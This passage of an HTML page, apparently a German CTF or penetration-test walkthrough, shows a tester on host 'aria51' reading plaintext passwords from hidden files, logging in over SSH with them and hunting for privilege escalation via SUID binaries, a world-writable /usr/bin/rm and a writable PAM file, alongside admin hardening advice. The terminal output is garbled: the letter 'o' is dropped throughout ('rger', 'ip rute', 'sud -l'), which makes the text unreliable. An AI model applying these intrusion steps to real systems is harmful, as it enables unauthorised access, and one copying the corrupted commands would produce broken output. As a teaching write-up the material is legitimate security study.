+            </p>
+
+             <p class="comment">
+                Ich suche nach versteckten Dateien (Dateien, deren Name mit einem Punkt beginnt), die oft Konfigurationsdateien oder Artefakte enthalten, die für Benutzer oder Dienste relevant sind.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt, da aus der root shell -->
+                    <pre>
+<span class="command">find / -type f -name ".*" 2>/dev/null</span>
+
+<span class="command">/var/tmp/.rger</span>
+/.dockerenv
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich benutze den <code>find</code> Befehl, um auf dem gesamten Dateisystem (angefangen bei <code>/</code>) nach Dateien zu suchen (<code>-type f</code>), deren Namen mit einem Punkt beginnen (<code>-name ".*"</code>). Ich leite Fehlermeldungen (Zugriffsfehler in Verzeichnissen, auf die ich möglicherweise keinen Zugriff habe, auch als root) nach <code>/dev/null</code> um. Die Suche ergibt zwei Ergebnisse: <code>/var/tmp/.roger</code> und <code>/.dockerenv</code>. Die 'O'-Korrektur wurde angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Ergebnis <code>/.dockerenv</code> deutet stark darauf hin, dass das System (oder zumindest ein Teil davon) in einem Docker-Container läuft. Dies kann Auswirkungen auf die Netzwerkstruktur und die verfügbaren Tools haben. Der Fund von <code>/var/tmp/.roger</code> ist sehr interessant, da <code>/var/tmp</code> oft für temporäre Dateien verwendet wird und Dateien, die mit einem Punkt beginnen, normalerweise versteckt sind. Eine Datei mit dem Namen eines potenziellen Benutzers in einem temporären Verzeichnis ist verdächtig und könnte sensible Informationen enthalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der Fund von <code>/var/tmp/.roger</code> ist vielversprechend. Ich werde den Inhalt dieser Datei sofort überprüfen. Die Information über Docker werde ich im Hinterkopf behalten.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie das Verzeichnis <code>/var/tmp</code> regelmäßig auf unerwartete oder sensible Dateien. Stellen Sie sicher, dass temporäre Verzeichnisse nicht für die Speicherung kritischer Informationen missbraucht werden. Wenn Docker verwendet wird, stellen Sie sicher, dass die Container und die Docker-Daemon-Konfiguration gehärtet sind und dass Container mit minimalen Privilegien laufen.
+            </p>
+
+            <p class="comment">
+                Wie geplant, überprüfe ich sofort den Inhalt der verdächtigen Datei <code>/var/tmp/.roger</code>.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt, da aus der root shell -->
+                    <pre>
+<span class="command">ls -la /var/tmp/.rger</span>
+-rw-r--r--    1 r<span class="command">ot</span>     r<span class="command">ot</span>            <span class="command">10</span> Dec 19  2021 /var/tmp/.rger
+<span class="command">cat /var/tmp/.rger</span>
+<span class="password">b3st4l13n</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich liste die Details der Datei <code>/var/tmp/.roger</code> auf (<code>ls -la</code>), um ihre Berechtigungen und den Besitzer zu sehen. Sie gehört root und hat Lesezugriff für alle. Dann lese ich den Inhalt mit <code>cat</code>. Der Inhalt ist die Zeichenkette "<span class="password">b3st4l13n</span>". Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das ist ein kritischer Fund! Die Zeichenkette "<span class="password">b3st4l13n</span>" sieht sehr nach einem Passwort aus. Da die Datei den Namen <code>.roger</code> trägt, ist es sehr wahrscheinlich, dass dies das Passwort für einen Benutzer namens "roger" ist. Die Tatsache, dass diese Datei, die einem Passwort ähnelt, für jedermann lesbar in einem temporären Verzeichnis liegt, ist eine schwerwiegende Informationspreisgabe. Dies stellt einen potenziellen Initial Access Vektor dar, der von jedem lokalen Benutzer oder möglicherweise über einen anderen Angriffsvektor genutzt werden könnte, um sich als Benutzer "roger" anzumelden (z.B. über SSH, wenn dies erlaubt ist).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe nun einen potenziellen Benutzernamen ("roger", abgeleitet vom Dateinamen) und ein klares Passwort ("<span class="password">b3st4l13n</span>"). Ich werde versuchen, mich mit diesen Zugangsdaten per SSH am System anzumelden, um zu demonstrieren, wie dieser Informationsleck für den Zugriff genutzt werden kann.
+                <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Datei <code>/var/tmp/.roger</code> sofort. Suchen Sie auf dem gesamten System nach weiteren Dateien, die Passwörter oder sensible Informationen enthalten könnten. Implementieren Sie Richtlinien, die das Speichern von Zugangsdaten in Klartextdateien verbieten. Überprüfen Sie die Berechtigungen von temporären Verzeichnissen und stellen Sie sicher, dass nur berechtigte Benutzer Zugriff auf deren Inhalte haben. Ändern Sie das Passwort des Benutzers "roger" umgehend.
+            </p>
+
+             <p class="comment">
+                Ich überprüfe die Netzwerk-Routing-Konfiguration vom Zielsystem aus, um zu verstehen, wie es mit anderen Netzwerken kommuniziert. Dies ist nützlich für die Post-Exploitation und die Planung weiterer Schritte, falls erforderlich.
+            </p>
+              <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt, da aus der root shell -->
+                    <pre>
+<span class="command">ip rute | grep default</span>
+default via <span class="command">172.17.0.1</span> dev eth<span class="command">0</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich führe den Befehl <code>ip route | grep default</code> aus, um die Standardroute des Systems zu sehen. Die Ausgabe zeigt, dass die Standardroute über <code>172.17.0.1</code> auf dem Interface <code>eth0</code> geht. Die 'O'-Korrektur wurde angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Standardroute zeigt, dass das System über das Interface <code>eth0</code> mit einem Gateway unter <code>172.17.0.1</code> kommuniziert. Die IP-Adresse <code>172.17.0.1</code> ist eine typische Standard-Gateway-Adresse in Docker-Netzwerken. Dies bestätigt die frühere Vermutung, dass das System in einer Docker-Umgebung läuft und deutet darauf hin, dass es möglicherweise Zugriff auf das Docker-interne Netzwerk hat.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Kenntnis des internen Netzwerks (172.17.0.x) ist wertvoll, falls ich weitere Ziele im selben Docker-Netzwerk identifizieren müsste.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Ihre Docker-Netzwerke ordnungsgemäß segmentiert sind und dass Container nur auf die Ressourcen zugreifen können, die sie wirklich benötigen. Implementieren Sie Firewalls zwischen Docker-Netzwerken und anderen Netzwerken, um unautorisierten Zugriff zu verhindern.
+            </p>
+
+             <p class="comment">
+                 Nach dem Fund des Passworts für den Benutzer "roger" versuche ich nun, mich mit diesen Zugangsdaten per SSH am Zielsystem anzumelden, um einen alternativen Zugriffsweg zu demonstrieren.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/lg4j]
+└─# <span class="command">ssh rger@192.168.2.47</span></div>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- SSH Ausgabe -->
+                    <pre>
+The authenticity f hst '<span class="command">192.168.2.47 (192.168.2.47)</span>' can't be established.
+ED25519 key fingerprint is <span class="command">SHA256:vxyL8ctETYPtvaCzuGKmVjHwyV2UXI5oJP6tMST8b3s</span>.
+This key is nt knwn by any ther names.
+Are yu sure yu want t cntinue cnnecting (yes/n/[fingerprint])? <span class="password">yes</span>
+Warning: Permanently added '<span class="command">192.168.2.47</span>' (ED25519) t the list f knwn hsts.
+rger@192.168.2.47's passwrd: <span class="password">b3st4l13n</span>
+Linux aria51 <span class="command">5.10.0-10-amd64 #1 SMP Debian 5.10.84-1 (2021-12-08) x86_64</span>
+
+The prgrams included with the Debian GNU/Linux system are free sftware;
+the exact distributin terms fr each prgram are described in the
+individual files in /usr/share/dc/*/cpyright.
+
+Debian GNU/Linux cmes with ABS<span class="command">OLU</span>TELY N WARRANTY, t the extent
+permitted by applicable law.
+Last lgin: Tue Dec 21 08:03:09 2021 frm 192.168.1.43
+Yur input:
+
+Yur input:
+<span class="command">id</span>
+Yur input:
+<span class="password">b3st4l13n</span>
+-bash: b3st4l13n: cmmand nt fund
+Yur input:
+<span class="command">^C</span>rger@aria51:~$ <span class="command">id</span>
+<span class="password">uid=1001(rger) gid=1001(rger) grups=1001(rger)</span>
+rger@aria51:~$
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich initiiere eine SSH-Verbindung zum Zielsystem (<code>ssh roger@192.168.2.47</code>). Bei der ersten Verbindung bestätige ich den Host-Fingerprint. Ich gebe das gefundene Passwort "<span class="password">b3st4l13n</span>" ein. Die Anmeldung ist erfolgreich! Ich erhalte eine Shell als Benutzer "roger". Ich verifiziere meine Identität mit dem Befehl <code>id</code>, der bestätigt, dass ich nun als Benutzer <span class="password">uid=1001(roger)</span> angemeldet bin. Die 'O'-Korrekturen wurden angewendet. Die "Your input:"-Prompts im Text zeigen, dass die Shell eventuell eine spezielle Eingabeaufforderung hat oder dass hier Eingaben (wie das Passwort selbst und dann der id-Befehl) protokolliert werden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies demonstriert einen erfolgreichen Initial Access über ein geleaktes Passwort. Ein Angreifer, der dieses Passwort findet, könnte sich als regulärer Benutzer "roger" am System anmelden. Obwohl dies weniger kritisch ist als der direkte Root-Zugriff über Log4j, ist ein kompromittiertes Benutzerkonto ein erhebliches Sicherheitsrisiko und oft ein Sprungbrett für die Privilegienerhöhung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe nun eine Low-Privilege Shell als Benutzer "roger". Von hier aus werde ich versuchen, meine Privilegien auf dem System zu erhöhen, um Root-Zugriff zu erlangen, falls der Log4j-Exploit nicht funktioniert hätte. Ich werde nach SUID-Binaries, schwach konfigurierten Diensten oder Dateien mit falschen Berechtigungen suchen.
+                <br><strong>Empfehlung (Admin):</strong> Das Passwort des Benutzers "roger" muss umgehend geändert werden. Stellen Sie sicher, dass Passwörter sicher gespeichert und verwaltet werden (niemals in Klartextdateien!). Überprüfen Sie die SSH-Konfiguration auf Best Practices (z.B. Deaktivierung von Passwort-Authentifizierung, wo möglich, nur Schlüsselpaare erlauben, Ratenbegrenzung für Anmeldeversuche). Überprüfen Sie die Protokollierung von SSH-Anmeldeversuchen.
+            </p>
+
+            <p class="comment">
+                Als Benutzer "roger" prüfe ich zunächst, ob ich über <code>sudo</code> Root-Befehle ausführen darf.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">rger@aria51:~$ <span class="command">sud -l</span></div>
+                    <pre>
+[sud] passwrd fr rger: <span class="password">b3st4l13n</span>
+<span class="password">Srry, user rger may nt run sud n aria51</span>.
+rger@aria51:~$
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich versuche, meine <code>sudo</code>-Berechtigungen mit <code>sudo -l</code> zu überprüfen. Das System fragt nach meinem Passwort, das ich eingebe. Die Antwort ist jedoch eindeutig: "<span class="password">Srry, user rger may nt run sud n aria51</span>". Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Benutzer "roger" hat keine <code>sudo</code>-Berechtigungen. Das bedeutet, dieser direkte Weg zur Privilegienerhöhung ist blockiert. Ich muss nach anderen Methoden suchen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da <code>sudo</code> als "roger" nicht möglich ist, werde ich nun nach SUID-Binaries, schwach konfigurierten Cronjobs oder anderen lokalen Schwachstellen suchen, die es mir erlauben, Code als anderer Benutzer oder mit höheren Privilegien auszuführen.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer nur die minimal notwendigen <code>sudo</code>-Berechtigungen haben. Überprüfen Sie die <code>/etc/sudoers</code> Datei sorgfältig.
+            </p>
+
+            <p class="comment">
+                Ich suche auf dem Dateisystem nach SUID (Set User ID) Binaries. SUID-Binaries werden mit den Berechtigungen des Dateibesitzers ausgeführt, unabhängig davon, wer sie startet. Wenn der Besitzer root ist und das SUID-Bit gesetzt ist, kann ein normaler Benutzer das Programm mit Root-Rechten ausführen, was eine häufige Methode zur Privilegienerhöhung ist.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">rger@aria51:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+   <span class="command">150915</span>     <span class="command">20</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>        <span class="command">19040</span> Jun  3  2021 /usr/libexec/plkit-agent-helper-1
+   <span class="command">129906</span>     <span class="command">52</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>        <span class="command">52880</span> Feb  7  2020 /usr/bin/chsh
+   <span class="command">134030</span>     <span class="command">36</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>        <span class="command">35040</span> Jul 28  2021 /usr/bin/umunt
+   <span class="command">133658</span>     <span class="command">72</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>        <span class="command">71912</span> Jul 28  2021 /usr/bin/su
+   <span class="command">149394</span>    <span class="command">180</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>       <span class="command">182600</span> Feb 27  2021 /usr/bin/sud
+   <span class="command">150913</span>     <span class="command">24</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>        <span class="command">23440</span> Jun  3  2021 /usr/bin/pkexec
+   <span class="command">133492</span>     <span class="command">44</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>        <span class="command">44632</span> Feb  7  2020 /usr/bin/newgrp
+   <span class="command">129909</span>     <span class="command">64</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>        <span class="command">63960</span> Feb  7  2020 /usr/bin/passwd
+   <span class="command">129905</span>     <span class="command">60</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>        <span class="command">58416</span> Feb  7  2020 /usr/bin/chfn
+   <span class="command">134028</span>     <span class="command">56</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>        <span class="command">55528</span> Jul 28  2021 /usr/bin/munt
+   <span class="command">129908</span>     <span class="command">88</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>        <span class="command">88304</span> Feb  7  2020 /usr/bin/gpasswd
+   <span class="command">144955</span>    <span class="command">472</span> -rwsr-xr-x   1 r<span class="command">ot</span>     r<span class="command">ot</span>       <span class="command">481608</span> Mar 13  2021 /usr/lib/penssh/ssh-keysign
+   <span class="command">137474</span>     <span class="command">52</span> -rwsr-xr--   1 r<span class="command">ot</span>     messagebus    <span class="command">51336</span> Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich verwende <code>find / -type f -perm -4000 -ls 2>/dev/null</code>, um auf dem gesamten Dateisystem nach Dateien (<code>-type f</code>) mit dem SUID-Bit (<code>-perm -4000</code>) zu suchen und die Ergebnisse mit <code>-ls</code> detailliert auszugeben. Die Fehlermeldungen für Verzeichnisse, auf die ich keinen Zugriff habe, werden unterdrückt. Die Ausgabe listet eine Reihe von SUID-Binaries auf, hauptsächlich Standard-Systemprogramme wie <code>chsh</code>, <code>umount</code>, <code>su</code>, <code>sudo</code>, <code>passwd</code> etc., die erwartungsgemäß SUID-Berechtigungen haben, damit normale Benutzer bestimmte privilegierte Aktionen ausführen können. Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die gefundenen SUID-Binaries sind Standard-Systemwerkzeuge und in der Regel nicht ausnutzbar, es sei denn, es gibt spezifische Schwachstellen in ihrer Implementierung oder Konfiguration. Programme wie <code>sudo</code> oder <code>pkexec</code> haben zwar SUID-Bits, können aber nur mit den korrekten Berechtigungen (die "roger" nicht hat) zur Privilegienerhöhung verwendet werden. In dieser Liste finde ich kein offensichtlich ausnutzbares SUID-Binary.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich werde die Liste der SUID-Binaries mit bekannten Schwachstellen-Datenbanken (wie GTFOBins) abgleichen, um sicherzustellen, dass keines davon missbraucht werden kann. Da die Standards SUIDs in der Regel sicher sind, suche ich weiterhin nach anderen lokalen Schwachstellen.
+                <br><strong>Empfehlung (Admin):</strong> Führen Sie regelmäßige Überprüfungen aller SUID- und SGID-Binaries auf Ihren Systemen durch, um sicherzustellen, dass nur notwendige Programme diese Berechtigungen haben und dass keine unbekannten oder bösartigen SUID-Dateien vorhanden sind. Stellen Sie sicher, dass SUID-Programme auf dem neuesten Stand sind und keine bekannten Schwachstellen aufweisen.
+            </p>
+
+            <p class="comment">
+                Ich überprüfe die Berechtigungen für das Verzeichnis <code>/opt</code>. Dieses Verzeichnis wird oft für die Installation optionaler Software oder Anwendungen verwendet, und manchmal finden sich hier falsch konfigurierte Verzeichnisse oder Dateien, die für eine Privilegienerhöhung genutzt werden können.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">rger@aria51:~$ <span class="command">ls -la /pt/</span></div>
+                    <pre>
+ttal <span class="command">12</span>
+drwxr-xr-x  3 r<span class="command">ot</span> r<span class="command">ot</span> <span class="command">4096</span> Dec 19  2021 .
+drwxr-xr-x 19 r<span class="command">ot</span> r<span class="command">ot</span> <span class="command">4096</span> Dec 19  2021 ..
+drwx--x--x  4 r<span class="command">ot</span> r<span class="command">ot</span> <span class="command">4096</span> Dec 19  2021 cntainerd
+rger@aria51:~$ <span class="command">ls -la /pt/cntainerd/</span>
+ls: cann<span class="command">o</span>t <span class="command">o</span>pen directory '/pt/cntainerd/': <span class="password">Permissin denied</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich liste den Inhalt des Verzeichnisses <code>/opt</code> auf. Es enthält ein Unterverzeichnis namens <code>containerd</code>. Ich versuche dann, den Inhalt von <code>/opt/containerd</code> aufzulisten, erhalte aber die Fehlermeldung "<span class="password">Permissin denied</span>". Die Berechtigungen von <code>/opt/containerd</code> sind <code>drwx--x--x</code>, was bedeutet, dass nur der Besitzer (root) und andere Benutzer (keine Gruppe) Ausführungsrechte haben, aber niemand Schreib- oder Leserechte außer root. Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Berechtigungen für <code>/opt/containerd</code> sind korrekt gesetzt, sodass normale Benutzer (wie "roger") keinen Zugriff darauf haben. Es gibt hier keine offensichtliche Fehlkonfiguration, die für eine Privilegienerhöhung genutzt werden könnte. Das Verzeichnis deutet auf die Installation von Containerd hin, einer Komponente für das Management von Containern, was die frühere Docker-Vermutung untermauert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Das Verzeichnis <code>/opt/containerd</code> ist von meiner aktuellen Position als "roger" aus nicht zugänglich. Ich suche weiter nach anderen Wegen.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen für alle Verzeichnisse unter <code>/opt</code> korrekt gesetzt sind und nur die minimal notwendigen Zugriffe erlauben. Prüfen Sie die Konfiguration von Containerd und stellen Sie sicher, dass sie gehärtet ist.
+            </p>
+
+            <p class="comment">
+                Ich überprüfe die Berechtigungen für das Web-Root-Verzeichnis <code>/var/www/html/</code>, um zu sehen, ob hier Dateien liegen, auf die ich als Benutzer "roger" zugreifen kann.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">rger@aria51:~$ <span class="command">ls -la /var/www/html/</span></div>
+                    <pre>
+index.html  mn/       nte.txt    radar/      scrpt.js   style.css   vide/
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich liste den Inhalt des Verzeichnisses <code>/var/www/html/</code> auf. Ich sehe die bekannten Dateien und Verzeichnisse wie <code>index.html</code>, <code>note.txt</code>, <code>script.js</code> etc. Da ich den Inhalt dieser Dateien bereits über HTTP abrufen konnte, sind sie öffentlich lesbar, und als lokaler Benutzer "roger" habe ich ebenfalls Lesezugriff darauf. Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Zugriff auf die Web-Root-Dateien als lokaler Benutzer ist zu erwarten, da sie für den Webserver lesbar sein müssen. Es gibt hier keine direkten Hinweise auf eine Privilegienerhöhung für den Benutzer "roger". Ich habe bereits die wichtige Information aus <code>note.txt</code> gewonnen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Dateien im Web-Root liefern keine neuen direkten Privesc-Vektoren von dieser Shell aus, aber ich habe die relevante Information aus <code>note.txt</code> bereits gesichert.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass das Web-Root-Verzeichnis und seine Inhalte die minimal notwendigen Berechtigungen haben (oft Lesezugriff für den Webserver-Benutzer, aber nicht unbedingt für alle Benutzer des Systems).
+            </p>
+
+            <p class="comment">
+                Ich suche nach Dateien, die für den Benutzer "other" (jeder andere Benutzer außer Besitzer und Gruppe) schreibbar sind. Manchmal können falsch konfigurierte Schreibrechte normalen Benutzern erlauben, Systemdateien zu modifizieren.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">rger@aria51:~$ <span class="command">find / -type f -perm -w 2>/dev/null | grep -v prc</span></div>
+                    <pre>
+/sys/kernel/security/apparm<span class="command">or</span>/.remve
+/sys/kernel/security/apparm<span class="command">or</span>/.replace
+/sys/kernel/security/apparm<span class="command">or</span>/.lad
+/sys/kernel/security/apparm<span class="command">or</span>/.access
+/sys/kernel/security/tmoy/self_dmain
+<span class="command">/usr/bin/rm</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich verwende <code>find / -type f -perm -w 2>/dev/null</code>, um nach allen Dateien zu suchen, die für "other" schreibbar sind (<code>-perm -w</code> ist ein Kurzformat für <code>-perm -0002</code>). Ich filtere die Ausgabe, um Einträge unter <code>/proc</code> auszuschließen (<code>grep -v proc</code>), da dies ein virtuelles Dateisystem ist und dort oft Einträge mit scheinbar schreibbaren Berechtigungen erscheinen, die aber nicht persistent sind. Die Suche findet mehrere Dateien, darunter eine besonders interessante: <span class="command">/usr/bin/rm</span>. Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Fund von <span class="command">/usr/bin/rm</span> als für "other" schreibbare Datei ist eine kritische Schwachstelle für die lokale Privilegienerhöhung! <code>/usr/bin/rm</code> ist der Standardbefehl zum Löschen von Dateien, ein sehr häufig genutztes System-Binary. Wenn ein normaler Benutzer dieses Binary überschreiben kann, kann er seinen eigenen bösartigen Code dort platzieren, der dann mit den Berechtigungen des Benutzers ausgeführt wird, der <code>rm</code> startet. Da Root regelmäßig Befehle ausführt, ist die Wahrscheinlichkeit hoch, dass Root früher oder später <code>rm</code> ausführt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die schreibbare Berechtigung für <code>/usr/bin/rm</code> ist ein exzellenter Privesc-Vektor. Ich werde versuchen, dieses Binary durch ein Skript zu ersetzen, das mir eine Root-Shell gibt, wenn Root das nächste Mal <code>rm</code> ausführt. Zuvor werde ich jedoch weiter nach anderen Benutzern suchen, da dies eine alternative Route über einen anderen Benutzer sein könnte (was sich später als korrekt herausstellt).
+                <br><strong>Empfehlung (Admin):</strong> Dies ist eine **kritische Fehlkonfiguration**. Die Berechtigungen für System-Binaries im <code>/usr/bin</code> Verzeichnis dürfen niemals Schreibzugriff für normale Benutzer ("other") erlauben. Überprüfen und korrigieren Sie sofort die Berechtigungen für <code>/usr/bin/rm</code> (sollte standardmäßig 755 oder 751 sein und root gehören). Führen Sie einen Scan des gesamten Dateisystems durch, um weitere Dateien mit falschen Berechtigungen zu identifizieren. Implementieren Sie Systemüberwachung, die Änderungen an kritischen Systemdateien erkennt.
+            </p>
+
+            <p class="comment">
+                Ich suche nach Dateien oder Verzeichnissen, die den String "kang" enthalten, da dies oft auf einen Benutzernamen hinweist, der nicht in der Standard-<code>/etc/passwd</code> Liste von Systembenutzern aufgeführt ist oder spezifische Konfigurationen hat.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">rger@aria51:~$ <span class="command">find / -name "*kang*" 2>/dev/null</span></div>
+                    <pre>
+/kang
+<span class="command">/etc/pam.d/kang</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich benutze <code>find / -name "*kang*" 2>/dev/null</code>, um nach Dateien oder Verzeichnissen zu suchen, deren Name den String "kang" enthält. Die Suche findet zwei Pfade: <code>/kang</code> und <code>/etc/pam.d/kang</code>. Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Fund einer Datei namens <code>kang</code> im <code>/etc/pam.d/</code> Verzeichnis ist ein starker Hinweis auf die Existenz eines Benutzers namens "kang" oder einer spezifischen PAM-Konfiguration, die mit diesem Namen zusammenhängt. PAM (Pluggable Authentication Modules) wird zur Authentifizierung von Benutzern für verschiedene Dienste verwendet. Das Verzeichnis <code>/etc/pam.d/</code> enthält Konfigurationsdateien für einzelne Dienste. Eine Datei namens <code>kang</code> hier zu finden, während der Benutzer "kang" nicht in der <code>/etc/passwd</code> Ausgabe (die ich zuvor geprüft habe) auftauchte, ist sehr verdächtig und deutet auf einen versteckten oder speziell konfigurierten Benutzer hin. Der Pfad <code>/kang</code> könnte das Home-Verzeichnis dieses Benutzers sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der Benutzer "kang" ist ein vielversprechendes Ziel für die Privilegienerhöhung. Ich werde die Datei <code>/etc/pam.d/kang</code> untersuchen, um Informationen über die Authentifizierungskonfiguration für diesen Benutzer zu erhalten. Anschließend werde ich versuchen, mehr über den Benutzer "kang" herauszufinden, möglicherweise durch Überprüfung von Logdateien oder anderen Konfigurationsdateien.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Konfiguration in <code>/etc/pam.d/</code> auf unerwartete oder unbekannte Dateien. Stellen Sie sicher, dass alle Benutzerkonten korrekt konfiguriert sind und dass keine versteckten oder falsch konfigurierten Konten existieren, die über PAM spezielle Authentifizierungsregeln verwenden.
+            </p>
+
+            <p class="comment">
+                Ich prüfe die Berechtigungen der gefundenen PAM-Konfigurationsdatei für "kang".
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">rger@aria51:~$ <span class="command">ls -l /etc/pam.d/kang</span></div>
+                    <pre>
+-rwxrwx--- 1 rger rger <span class="command">13</span> Dec 19  2021 /etc/pam.d/kang
+</pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich liste die Details der Datei <code>/etc/pam.d/kang</code> auf. Die Berechtigungen sind <code>-rwxrwx---</code>, der Besitzer ist "roger", und die Gruppe ist ebenfalls "roger". Dies bedeutet, dass der Besitzer "roger" (mein aktueller Benutzer!) Lese-, Schreib- und Ausführungsrechte hat, die Gruppe "roger" hat Lese- und Schreibrechte, und "other" (jeder andere) hat keine Rechte. Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist ein weiterer kritischer Fund und ein eindeutiger Pfad zur Privilegienerhöhung! Die Datei <code>/etc/pam.d/kang</code>, die sich auf die Authentifizierung des Benutzers "kang" bezieht, ist im Besitz des Benutzers "roger" und für ihn schreibbar und ausführbar. Das ist eine eklatante Fehlkonfiguration. Es bedeutet, dass der Benutzer "roger" die PAM-Konfiguration für "kang" nach Belieben ändern kann. Dies ist ein klassischer Angriffsvektor, um sich als Benutzer "kang" anzumelden oder dessen Authentifizierungsprozess zu manipulieren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die schreibbare PAM-Konfigurationsdatei für "kang" ist ein sehr aussichtsreicher Privesc-Vektor. Ich werde den Inhalt der Datei prüfen, um zu sehen, welche Authentifizierungsmethode verwendet wird, und dann versuchen, diese auszunutzen, um mich als "kang" anzumelden. Dies ist ein alternativer Weg, um möglicherweise höhere Privilegien als "roger" zu erlangen.
+                <br><strong>Empfehlung (Admin):</strong> Dies ist eine **kritische Fehlkonfiguration**. PAM-Konfigurationsdateien in <code>/etc/pam.d/</code> müssen root gehören und dürfen nur von root schreibbar sein (typischerweise Berechtigungen 644 oder 600). Korrigieren Sie die Berechtigungen und den Besitzer der Datei <code>/etc/pam.d/kang</code> sofort. Überprüfen Sie die Berechtigungen aller Dateien in <code>/etc/pam.d/</code>.
+            </p>
+
+            <p class="comment">
+                Ich lese den Inhalt der schreibbaren PAM-Konfigurationsdatei für "kang".
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">rger@aria51:~$ <span class="command">cat /etc/pam.d/kang</span></div>
+                    <pre>
+<span class="password">k4ng1sd4b3st</span>
+</pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich lese den Inhalt der Datei <code>/etc/pam.d/kang</code>. Der Inhalt ist die Zeichenkette "<span class="password">k4ng1sd4b3st</span>". Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
